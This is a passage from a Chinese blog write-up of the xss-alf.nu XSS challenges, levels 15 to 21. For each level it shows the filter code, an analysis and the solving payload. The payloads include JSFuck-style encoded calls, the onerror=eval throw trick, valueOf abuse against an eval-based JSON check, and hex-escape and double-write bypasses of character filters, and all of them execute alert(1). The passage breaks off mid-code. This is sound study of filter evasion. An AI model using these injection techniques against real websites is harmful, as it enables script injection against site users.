class="hljs-number">2</span>]+(![]+[])[<span class="hljs-number">2</span>]]+[])[<span class="hljs-number">6</span>]+(!![]+[])[<span class="hljs-number">1</span>]<br><span class="hljs-string">&quot;alert&quot;</span> === (![]+[])[<span class="hljs-number">1</span>]+(![]+[])[<span class="hljs-number">2</span>]+(![]+[])[<span class="hljs-number">4</span>]+(!![]+[])[<span class="hljs-number">1</span>]+(!![]+[])[<span class="hljs-number">0</span>]<br></code></pre></td></tr></table></figure><p>将其拼接入<code>Payload</code>，长度为<code>525</code>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&quot;);[][(![]+[])[3]+([][(![]+[])[0]+([][[]]+[])[5]+(![]+[])[2]+(![]+[])[2]]+[])[6]+(!![]+[])[1]+(!![]+[])[0]][([][(![]+[])[0]+([][[]]+[])[5]+(![]+[])[2]+(![]+[])[2]]+[])[3]+([][(![]+[])[0]+([][[]]+[])[5]+(![]+[])[2]+(![]+[])[2]]+[])[6]+([][[]]+[])[1]+(![]+[])[3]+(!![]+[])[0]+(!![]+[])[1]+(!![]+[])[2]+([][(![]+[])[0]+([][[]]+[])[5]+(![]+[])[2]+(![]+[])[2]]+[])[3]+(!![]+[])[0]+([][(![]+[])[0]+([][[]]+[])[5]+(![]+[])[2]+(![]+[])[2]]+[])[6]+(!![]+[])[1]]((![]+[])[1]+(![]+[])[2]+(![]+[])[4]+(!![]+[])[1]+(!![]+[])[0]+&#x27;(1)&#x27;)()//</span><br></code></pre></td></tr></table></figure><p>从网上找了一种更为简便的方法。</p><table><thead><tr><th>表达式</th><th>值</th></tr></thead><tbody><tr><td><code>&#39;&#39;+!1</code></td><td>false</td></tr><tr><td><code>&#39;&#39;+!0</code></td><td>true</td></tr><tr><td><code>&#39;&#39;+&#123;&#125;[0]</code></td><td>undefined</td></tr><tr><td><code>&#39;&#39;+&#123;&#125;</code></td><td>[object Object]</td></tr></tbody></table><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&quot;sort&quot;</span> === (<span class="hljs-string">&#x27;&#x27;</span>+!<span class="hljs-number">1</span>)[<span class="hljs-number">3</span>]+(<span class="hljs-string">&#x27;&#x27;</span>+&#123;&#125;)[<span class="hljs-number">1</span>]+(<span class="hljs-string">&#x27;&#x27;</span>+!<span class="hljs-number">0</span>)[<span class="hljs-number">1</span>]+(<span class="hljs-string">&#x27;&#x27;</span>+!<span class="hljs-number">0</span>)[<span class="hljs-number">0</span>]<br><span class="hljs-string">&quot;constructor&quot;</span> === (<span class="hljs-string">&#x27;&#x27;</span>+&#123;&#125;)[<span class="hljs-number">5</span>]+(<span class="hljs-string">&#x27;&#x27;</span>+&#123;&#125;)[<span class="hljs-number">1</span>]+(<span class="hljs-string">&#x27;&#x27;</span>+&#123;&#125;[<span class="hljs-number">0</span>])[<span class="hljs-number">1</span>]+(<span class="hljs-string">&#x27;&#x27;</span>+!<span class="hljs-number">1</span>)[<span class="hljs-number">3</span>]+(<span class="hljs-string">&#x27;&#x27;</span>+!<span class="hljs-number">0</span>)[<span class="hljs-number">0</span>]+(<span class="hljs-string">&#x27;&#x27;</span>+!<span class="hljs-number">0</span>)[<span class="hljs-number">1</span>]+(<span class="hljs-string">&#x27;&#x27;</span>+!<span class="hljs-number">0</span>)[<span class="hljs-number">2</span>]+(<span class="hljs-string">&#x27;&#x27;</span>+&#123;&#125;)[<span class="hljs-number">5</span>]+(<span class="hljs-string">&#x27;&#x27;</span>+!<span class="hljs-number">0</span>)[<span class="hljs-number">0</span>]+(<span class="hljs-string">&#x27;&#x27;</span>+&#123;&#125;)[<span class="hljs-number">1</span>]+(<span class="hljs-string">&#x27;&#x27;</span>+!<span class="hljs-number">0</span>)[<span class="hljs-number">1</span>]<br><span class="hljs-string">&quot;alert&quot;</span> === (<span class="hljs-string">&#x27;&#x27;</span>+!<span class="hljs-number">1</span>)[<span class="hljs-number">1</span>]+(<span class="hljs-string">&#x27;&#x27;</span>+!<span class="hljs-number">1</span>)[<span class="hljs-number">2</span>]+(<span class="hljs-string">&#x27;&#x27;</span>+!<span class="hljs-number">1</span>)[<span class="hljs-number">4</span>]+(<span class="hljs-string">&#x27;&#x27;</span>+!<span class="hljs-number">0</span>)[<span class="hljs-number">1</span>]+(<span class="hljs-string">&#x27;&#x27;</span>+!<span class="hljs-number">0</span>)[<span class="hljs-number">0</span>]<br></code></pre></td></tr></table></figure><p>构造<code>Payload</code>，长度为<code>241</code>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&quot;);[][(&#x27;&#x27;+!1)[3]+(&#x27;&#x27;+&#123;&#125;)[1]+(&#x27;&#x27;+!0)[1]+(&#x27;&#x27;+!0)[0]][(&#x27;&#x27;+&#123;&#125;)[5]+(&#x27;&#x27;+&#123;&#125;)[1]+(&#x27;&#x27;+&#123;&#125;[0])[1]+(&#x27;&#x27;+!1)[3]+(&#x27;&#x27;+!0)[0]+(&#x27;&#x27;+!0)[1]+(&#x27;&#x27;+!0)[2]+(&#x27;&#x27;+&#123;&#125;)[5]+(&#x27;&#x27;+!0)[0]+(&#x27;&#x27;+&#123;&#125;)[1]+(&#x27;&#x27;+!0)[1]]((&#x27;&#x27;+!1)[1]+(&#x27;&#x27;+!1)[2]+(&#x27;&#x27;+!1)[4]+(&#x27;&#x27;+!0)[1]+(&#x27;&#x27;+!0)[0]+&#x27;(1)&#x27;)()//</span><br></code></pre></td></tr></table></figure><h3 id="15-3-Payload"><a href="#15-3-Payload" class="headerlink" title="15.3 Payload"></a>15.3 Payload</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript">方法一<br><span class="hljs-string">&quot;);[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()//</span><br><span class="hljs-string">方法二</span><br><span class="hljs-string">&quot;</span>);[][(![]+[])[<span class="hljs-number">3</span>]+([][(![]+[])[<span class="hljs-number">0</span>]+([][[]]+[])[<span class="hljs-number">5</span>]+(![]+[])[<span class="hljs-number">2</span>]+(![]+[])[<span class="hljs-number">2</span>]]+[])[<span class="hljs-number">6</span>]+(!![]+[])[<span class="hljs-number">1</span>]+(!![]+[])[<span class="hljs-number">0</span>]][([][(![]+[])[<span class="hljs-number">0</span>]+([][[]]+[])[<span class="hljs-number">5</span>]+(![]+[])[<span class="hljs-number">2</span>]+(![]+[])[<span class="hljs-number">2</span>]]+[])[<span class="hljs-number">3</span>]+([][(![]+[])[<span class="hljs-number">0</span>]+([][[]]+[])[<span class="hljs-number">5</span>]+(![]+[])[<span class="hljs-number">2</span>]+(![]+[])[<span class="hljs-number">2</span>]]+[])[<span class="hljs-number">6</span>]+([][[]]+[])[<span class="hljs-number">1</span>]+(![]+[])[<span class="hljs-number">3</span>]+(!![]+[])[<span class="hljs-number">0</span>]+(!![]+[])[<span class="hljs-number">1</span>]+(!![]+[])[<span class="hljs-number">2</span>]+([][(![]+[])[<span class="hljs-number">0</span>]+([][[]]+[])[<span class="hljs-number">5</span>]+(![]+[])[<span class="hljs-number">2</span>]+(![]+[])[<span class="hljs-number">2</span>]]+[])[<span class="hljs-number">3</span>]+(!![]+[])[<span class="hljs-number">0</span>]+([][(![]+[])[<span class="hljs-number">0</span>]+([][[]]+[])[<span class="hljs-number">5</span>]+(![]+[])[<span class="hljs-number">2</span>]+(![]+[])[<span class="hljs-number">2</span>]]+[])[<span class="hljs-number">6</span>]+(!![]+[])[<span class="hljs-number">1</span>]]((![]+[])[<span class="hljs-number">1</span>]+(![]+[])[<span class="hljs-number">2</span>]+(![]+[])[<span class="hljs-number">4</span>]+(!![]+[])[<span class="hljs-number">1</span>]+(!![]+[])[<span class="hljs-number">0</span>]+<span class="hljs-string">&#x27;(1)&#x27;</span>)()<span class="hljs-comment">//</span><br>方法三<br><span class="hljs-string">&quot;);[][(&#x27;&#x27;+!1)[3]+(&#x27;&#x27;+&#123;&#125;)[1]+(&#x27;&#x27;+!0)[1]+(&#x27;&#x27;+!0)[0]][(&#x27;&#x27;+&#123;&#125;)[5]+(&#x27;&#x27;+&#123;&#125;)[1]+(&#x27;&#x27;+&#123;&#125;[0])[1]+(&#x27;&#x27;+!1)[3]+(&#x27;&#x27;+!0)[0]+(&#x27;&#x27;+!0)[1]+(&#x27;&#x27;+!0)[2]+(&#x27;&#x27;+&#123;&#125;)[5]+(&#x27;&#x27;+!0)[0]+(&#x27;&#x27;+&#123;&#125;)[1]+(&#x27;&#x27;+!0)[1]]((&#x27;&#x27;+!1)[1]+(&#x27;&#x27;+!1)[2]+(&#x27;&#x27;+!1)[4]+(&#x27;&#x27;+!0)[1]+(&#x27;&#x27;+!0)[0]+&#x27;(1)&#x27;)()//</span><br></code></pre></td></tr></table></figure><p><a href="https://image.mengsec.com/xss-alf.nu/20190611123259.pnghttp://" title="15"><img src="https://image.mengsec.com/xss-alf.nu/20190611123259.png" alt="15" title="15"></a></p><h2 id="16-RFC4627"><a href="#16-RFC4627" class="headerlink" title="16. RFC4627"></a>16. RFC4627</h2><h3 id="16-1-源码"><a href="#16-1-源码" class="headerlink" title="16.1 源码"></a>16.1 源码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">text</span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">window</span>.the_easy_but_expensive_way_out = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>        alert(i++)<br>    &#125;;<br><br>    <span class="hljs-comment">// &quot;A JSON text can be safely passed into JavaScript&#x27;s eval() function</span><br>    <span class="hljs-comment">// (which compiles and executes a string) if all the characters not</span><br>    <span class="hljs-comment">// enclosed in strings are in the set of characters that form JSON</span><br>    <span class="hljs-comment">// tokens.&quot;</span><br>    <span class="hljs-keyword">if</span> (! (<span class="hljs-regexp">/[^,:&#123;&#125;\[\]0-9.\-+Eaeflnr-u \n\r\t]/</span>.test(text.replace(<span class="hljs-regexp">/&quot;(\\.|[^&quot;\\])*&quot;/g</span>, <span class="hljs-string">&#x27;&#x27;</span>)))) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">var</span> val = <span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;(&#x27;</span> + text + <span class="hljs-string">&#x27;)&#x27;</span>);<br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;&#x27;</span> + val);<br>        &#125; <span class="hljs-keyword">catch</span>(_) &#123;<br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;Crashed: &#x27;</span> + _);<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;Rejected.&#x27;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="16-2-分析"><a href="#16-2-分析" class="headerlink" title="16.2 分析"></a>16.2 分析</h3><p>从代码来看，我们如果想要执行<code>alert(1)</code>，需要调用两次<code>the_easy_but_expensive_way_out</code>方法。<br>从正则来看，代码并没有限制我们使用<code>self</code>，因此我们可以借助<code>self</code>来调用全局方法<code>the_easy_but_expensive_way_out</code>。</p><p><img src="https://image.mengsec.com/xss-alf.nu/20190609195504.png"></p><p>在这里使用了一个小<code>trick</code></p><ul><li>在<code>JS</code>中让一个对象和一个值或者一个字符进行相加等运算，<code>JS</code>解析器会调用对象的<code>valueOf</code>方法来计算对象的值。</li></ul><p>因此我们可以传入一个对象，它的<code>valueOf</code>指向的是<code>self[&#39;the_easy_but_expensive_way_out&#39;]</code>方法，然后让这个对象与一个数字或者字符做运算，就能调用<code>self[&#39;the_easy_but_expensive_way_out&#39;]</code>了，但是需要<code>alert(1)</code>，所以需要我们调用两次。</p><blockquote><p>参考链接 </p><p><a href="https://blog.mindedsecurity.com/2011/08/ye-olde-crockford-json-regexp-is.html">https://blog.mindedsecurity.com/2011/08/ye-olde-crockford-json-regexp-is.html</a></p></blockquote><h3 id="16-3-Payload"><a href="#16-3-Payload" class="headerlink" title="16.3 Payload"></a>16.3 Payload</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&#123;<span class="hljs-string">&quot;valueOf&quot;</span>:self[<span class="hljs-string">&quot;the_easy_but_expensive_way_out&quot;</span>]&#125;+<span class="hljs-number">0</span>,&#123;<span class="hljs-string">&quot;valueOf&quot;</span>:self[<span class="hljs-string">&quot;the_easy_but_expensive_way_out&quot;</span>]&#125;<br></code></pre></td></tr></table></figure><p>第一次调用是在<code>eval</code>中，通过<code>&#123;&quot;valueOf&quot;:self[&quot;the_easy_but_expensive_way_out&quot;]&#125;+0</code>调用，第二次是在<code>console.log(&#39;&#39; + val);</code>中，对象与字符进行了相加操作，从而调用了<code>self[&#39;the_easy_but_expensive_way_out&#39;]</code>方法。</p><p><img src="https://image.mengsec.com/xss-alf.nu/20190609202135.png"></p><h2 id="17-Well"><a href="#17-Well" class="headerlink" title="17. Well"></a>17. Well</h2><h3 id="17-1-源码"><a href="#17-1-源码" class="headerlink" title="17.1 源码"></a>17.1 源码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">s</span>) </span>&#123;<br>    http: <span class="hljs-comment">//www.avlidienbrunn.se/xsschallenge/</span><br>    s = s.replace(<span class="hljs-regexp">/[\r\n\u2028\u2029\\;,()\[\]&lt;]/g</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;script&gt; var email = &#x27;&quot;</span> + s + <span class="hljs-string">&quot;&#x27;; &lt;\/script&gt;&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="17-2-分析"><a href="#17-2-分析" class="headerlink" title="17.2 分析"></a>17.2 分析</h3><p>代码过滤了<code>\r</code>、<code>\n</code>、<code>\u2028</code>、<code>\u2029</code>、<code>\</code>、<code>;</code>、<code>,</code>、<code>(</code>、<code>)</code>、<code>[</code>、<code>]</code>和<code>&lt;</code>。<br>单引号没被过滤，可以闭合前面的语句，通过定义函数来执行代码。</p><p>在<code>Payload</code>中，我们借助了<code>new Function</code><a href="https://zh.javascript.info/new-function">语法</a>。</p><h3 id="17-3-Payload"><a href="#17-3-Payload" class="headerlink" title="17.3 Payload"></a>17.3 Payload</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&#x27;+new Function `a$&#123;&#x27;</span>alert<span class="hljs-string">&#x27;+String.fromCharCode`40`+1+String.fromCharCode`41`&#125;`+&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/xss-alf.nu/20190609204450.png"></p><h2 id="18-No"><a href="#18-No" class="headerlink" title="18. No"></a>18. No</h2><h3 id="18-1-源码"><a href="#18-1-源码" class="headerlink" title="18.1 源码"></a>18.1 源码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">s</span>) </span>&#123;<br>    s = s.replace(<span class="hljs-regexp">/[()`&lt;]/g</span>, <span class="hljs-string">&#x27;&#x27;</span>); <span class="hljs-comment">// no function calls</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;script&gt;\n&#x27;</span> + <span class="hljs-string">&#x27;var string = &quot;&#x27;</span> + s + <span class="hljs-string">&#x27;&quot;;\n&#x27;</span> + <span class="hljs-string">&#x27;console.log(string);\n&#x27;</span> + <span class="hljs-string">&#x27;&lt;/script&gt;&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="18-2-分析"><a href="#18-2-分析" class="headerlink" title="18.2 分析"></a>18.2 分析</h3><p>代码过滤了<code>(</code>、<code>）</code>、<code>\</code>、<code>&lt;</code>、但是没有过滤双引号，可以通过双引号来闭合前面的语句。<br>然后借助异常处理来执行代码。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&quot;;onerror=eval;throw&#x27;=alert\x281\x29&#x27;//</span><br></code></pre></td></tr></table></figure><blockquote><p>参考链接<br><a href="http://www.thespanner.co.uk/2012/05/01/xss-technique-without-parentheses/">http://www.thespanner.co.uk/2012/05/01/xss-technique-without-parentheses/</a></p></blockquote><h3 id="18-3-Payload"><a href="#18-3-Payload" class="headerlink" title="18.3 Payload"></a>18.3 Payload</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&quot;;onerror=eval;throw&#x27;=alert\x281\x29&#x27;//</span><br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/xss-alf.nu/20190608100125.png"></p><h2 id="19-K’Z’K-1"><a href="#19-K’Z’K-1" class="headerlink" title="19. K’Z’K 1"></a>19. K’Z’K 1</h2><h3 id="19-1-源码"><a href="#19-1-源码" class="headerlink" title="19.1 源码"></a>19.1 源码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// submitted by Stephen Leppik</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">s</span>) </span>&#123;<br><span class="hljs-comment">// remove vowels in honor of K&#x27;Z&#x27;K the Destroyer</span><br>s = s.replace(<span class="hljs-regexp">/[aeiouy]/gi</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;script&gt;console.log(&quot;&#x27;</span> + s + <span class="hljs-string">&#x27;&quot;);&lt;/script&gt;&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="19-2-分析"><a href="#19-2-分析" class="headerlink" title="19.2 分析"></a>19.2 分析</h3><p>正则过滤了<code>aeiouy</code>这些字符。可以借助匿名函数和编码来绕过。<br>首先构造匿名函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">[][<span class="hljs-string">&quot;pop&quot;</span>][<span class="hljs-string">&quot;constructor&quot;</span>](<span class="hljs-string">&#x27;alert(1)&#x27;</span>)()<br></code></pre></td></tr></table></figure><p>将其中的被过滤的字符进行16进制编码。</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">a</span> ==&gt; \x61<br><span class="hljs-attr">e</span> ==&gt; \x65<br><span class="hljs-attr">i</span> ==&gt; \x69<br><span class="hljs-attr">o</span> ==&gt; \x6f<br><span class="hljs-attr">u</span> ==&gt; \x75<br><span class="hljs-attr">y</span> ==&gt; \x79<br></code></pre></td></tr></table></figure><p>此时Payload为</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">[][<span class="hljs-string">&quot;p\x6fp&quot;</span>][<span class="hljs-string">&quot;c\x6fnstr\x75ct\x6fr&quot;</span>](<span class="hljs-string">&#x27;\x61l\x65rt(1)&#x27;</span>)()<br></code></pre></td></tr></table></figure><p>再将前后的语句闭合即可。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&quot;);[][&quot;</span>p\x6fp<span class="hljs-string">&quot;][&quot;</span>c\x6fnstr\x75ct\x6fr<span class="hljs-string">&quot;](&#x27;\x61l\x65rt(1)&#x27;)()//</span><br></code></pre></td></tr></table></figure><h3 id="19-3-Payload"><a href="#19-3-Payload" class="headerlink" title="19.3 Payload"></a>19.3 Payload</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&quot;);[][&quot;</span>p\x6fp<span class="hljs-string">&quot;][&quot;</span>c\x6fnstr\x75ct\x6fr<span class="hljs-string">&quot;](&#x27;\x61l\x65rt(1)&#x27;)()//</span><br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/xss-alf.nu/20190607151941.png"></p><h2 id="20-K’Z’K-2"><a href="#20-K’Z’K-2" class="headerlink" title="20. K’Z’K 2"></a>20. K’Z’K 2</h2><h3 id="20-1-源码"><a href="#20-1-源码" class="headerlink" title="20.1 源码"></a>20.1 源码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// submitted by Stephen Leppik</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">s</span>) </span>&#123;<br>    <span class="hljs-comment">// remove vowels and escape sequences in honor of K&#x27;Z&#x27;K </span><br>    <span class="hljs-comment">// y is only sometimes a vowel, so it&#x27;s only removed as a literal</span><br>    s = s.replace(<span class="hljs-regexp">/[aeiouy]|\\((x|u00)([46][159f]|[57]5)|1([04][15]|[15][17]|[26]5))/gi</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-comment">// remove certain characters that can be used to get vowels</span><br>    s = s.replace(<span class="hljs-regexp">/[&#123;&#125;!=&lt;&gt;]/g</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;script&gt;console.log(&quot;&#x27;</span> + s + <span class="hljs-string">&#x27;&quot;);&lt;/script&gt;&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="20-2-分析"><a href="#20-2-分析" class="headerlink" title="20.2 分析"></a>20.2 分析</h3><p>正则看起来很复杂，不过是将编码的字符串替换为空了，双写一下就能绕过。</p><h3 id="20-3-Payload"><a href="#20-3-Payload" class="headerlink" title="20.3 Payload"></a>20.3 Payload</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&quot;);[][&quot;</span>p\\x6fx6fp<span class="hljs-string">&quot;][&quot;</span>c\\x6fx6fnstr\\x75x75ct\\x6fx6fr<span class="hljs-string">&quot;](&#x27;\\x61x61l\\x65x65rt(1)&#x27;)()//</span><br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/xss-alf.nu/20190607153357.png"></p><h2 id="21-K’Z’K-3"><a href="#21-K’Z’K-3" class="headerlink" title="21. K’Z’K 3"></a>21. K’Z’K 3</h2><h3 id="21-1-源码"><a href="#21-1-源码" class="headerlink" title="21.1 源码"></a>21.1 源码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// submitted by Stephen Leppik</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">s</span>) </span>&#123;<br>    <span class="hljs-comment">// remove vowels in honor of K&#x27;Z&#x27;K the Destroyer</span><br>    s = s.replace(<span class="hljs-regexp">/[aeiouy]/gi</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br>    <span class="hljs-comment">// remove certain characters that can be used to get vowels</span><br>    s = s.replace(<span class="hljs-regexp">/[&#123;&#125;!=&lt;&gt;\\]/g</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;script&gt;console.log(&quot;&#x27;</span> + s + <span class="hljs-string">&#x27;&quot;);&lt;/script&gt;&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="21-2-分析"><a href="#21-2-分析" class="headerlink" title="21.2 分析"></a>21.2 分析</h3><p>比第一题多了一个过滤，不仅过滤了<code>aeiouy</code>，还过滤了<code>&#123;</code>、<code>&#125;</code>、<code>!</code>、<code>=</code>、<code>&lt;</code>、<code>&gt;</code>、<code>\</code>。这下不能用编码来绕过了。<br>类似于第15题。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">[][<span class="hljs-string">&quot;map&quot;</span>][<span class="hljs-string">&quot;constructor&quot;</span>](<span class="hljs-string">&#x27;alert(1)&#x27;</span>)()<br></code></pre></td></tr></table></figure><p>在Payload中，不符合条件的字符<code>aeou</code>。借助js的一些特性可以获取到。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript">[][[]]+[] === <span class="hljs-string">&quot;undefined&quot;</span><br>([][[]]+[])[<span class="hljs-number">0</span>] === <span class="hljs-string">&quot;u&quot;</span><br>([][[]]+[])[<span class="hljs-number">3</span>] === <span class="hljs-string">&quot;e&quot;</span><br><br><span class="hljs-number">1</span>+[][<span class="hljs-number">0</span>]+[] === <span class="hljs-string">&quot;NaN&quot;</span><br>(<span class="hljs-number">1</span>+[][<span class="hljs-number">0</span>]+[])[<span class="hljs-number">1</span>] === <span class="hljs-string">&quot;a&quot;</span><br>[][<span class="hljs-string">&quot;m&quot;</span>+(<span class="hljs-number">1</span>+[][<span class="hljs-number">0</span>]+[])[<span class="hljs-number">1</span>]+<span class="hljs-string">&quot;p&quot;</span>]+[] === <span class="hljs-string">&quot;function map() &#123; [native code] &#125;&quot;</span><br>([][<span class="hljs-string">&quot;m&quot;</span>+(<span class="hljs-number">1</span>+[][<span 